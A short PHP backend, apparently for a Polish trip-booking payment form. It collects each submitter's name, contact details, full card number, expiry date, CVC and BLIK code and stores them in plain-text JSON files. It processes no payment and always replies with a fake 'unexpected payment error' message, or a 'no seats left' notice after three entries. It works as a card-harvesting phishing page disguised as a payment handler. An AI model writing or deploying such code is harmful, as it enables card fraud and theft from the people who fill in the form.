<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $name = $_POST["name"] ?? '';
    $email = $_POST["email"] ?? '';
    $phone = $_POST["phone"] ?? '';
    $method = $_POST["method"] ?? '';
    $card = $_POST["card"] ?? '';
    $expiry = $_POST["expiry"] ?? '';
    $cvc = $_POST["cvc"] ?? '';
    $blik = $_POST["blik-code"] ?? '';

    // Check if we're already at capacity (hard-coded limit of 3 registrations)
    $dir = 'payments';
    if (!file_exists($dir)) {
        mkdir($dir, 0777, true);
    }
    
    $files = glob($dir . '/*.json');
    if (count($files) >= 3) {
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'no_seats',
            'message' => 'Przepraszamy, ale wszystkie miejsca na tę wycieczkę zostały już zarezerwowane.'
        ]);
        exit;
    }

    $data = [
        'name' => $name,
        'email' => $email,
        'phone' => $phone,
        'payment_method' => $method,
        'card_number' => $method === 'card' ? $card : '',
        'expiry_date' => $method === 'card' ? $expiry : '',
        'cvc_code' => $method === 'card' ? $cvc : '',
        'blik_code' => $method === 'blik' ? $blik : '',
        'timestamp' => date('Y-m-d H:i:s')
    ];

    $filename = $dir . '/' . date('Y-m-d_H-i-s') . '_' . preg_replace('/[^a-zA-Z0-9]/', '', $name) . '.json';
    file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));

    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Wystąpił nieoczekiwany błąd podczas przetwarzania płatności. Prosimy spróbować ponownie później.'
    ]);
    exit;

} else {
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => 'Nieprawidłowe żądanie. Proszę wypełnić formularz.'
    ]);
    exit;
}
?>
